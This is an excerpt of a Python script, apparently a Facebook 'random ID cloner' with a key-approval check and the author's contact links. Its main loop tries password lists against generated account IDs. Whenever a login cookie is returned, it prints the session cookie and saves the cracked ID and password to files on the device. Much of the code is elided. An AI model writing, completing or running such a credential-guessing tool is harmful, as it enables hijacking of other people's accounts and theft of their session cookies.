#ROKON(SAT SHAHIN YT)(SHAHI. ALAM)
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By ROKON")
...
for xd in range(3005):
    ...
    uas.append(ff)
for ROKON in range(9993,176281):
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/Tony-Stark01/ROKON-OK/main/Approval.txt').text
...
\t \033[1;34m ░█─░█    ░█▄▄▄█     ░█─░█    ░█▄▄▄█     ░█──▀█  
    ...
    │ [✓] AUTHOR   : ROKON            │
    │ [✓] FACEBOOK   : ROKON VAI                 │
    │ [✓] WHATSAPP : +8801819241095         │
    │ [✓] VERSION  : 1.0                  │
    │ [✓] TOOLS    : \033[1;32m RANDOM GAME ID CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m Hi	!!🥀 I'm ROKON™ \033[1;37m ")
  print(f"")
  print(f"\t \033[1;33m  I'm From SIRAJGANJ  \033[1;37m ")
  print(f"")
  print(f"\t \033[1;34m  MY  FAVOURITE GAME FREE FIRE\033[1;37m ")
  print(f"")
  ...
  print(f"")
  print(f"\033[1;32     YOUR  KEY :ROKON-VAI= "+id)
  print(f"")
  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print(f"")
  print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system(f'xdg-open https://www.facebook.com/profile.php?id=100083617356869')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/RDJ/ROKON-OK/main/Approval.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801819241095?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801819241095');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100083617356869');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@b.c.egamer6181?si=2nvXhluS0EOKsf_A');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mROKON1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ROKON-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/ROKON-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/ROKON1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ROKON-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
